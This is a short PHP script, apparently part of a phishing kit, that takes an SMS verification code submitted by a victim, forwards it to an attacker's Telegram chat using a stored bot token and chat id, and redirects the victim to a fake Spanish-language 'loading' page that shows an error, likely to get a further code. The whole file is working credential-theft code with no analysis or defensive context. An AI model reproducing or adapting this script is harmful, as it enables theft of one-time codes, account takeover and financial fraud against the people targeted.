<?php
include "../telegram.php";
$sms2 = $_POST['sms2'];
$message .= 'Sms 2 : ' . $sms2 . "\r\n";
$tk = $token; $chid = $chatid; sendMessage($chid, $message, $tk);
header("location: ../Seleccione_medio_de_codigo_loading.php?error=1&validation#_$dispatch");
?>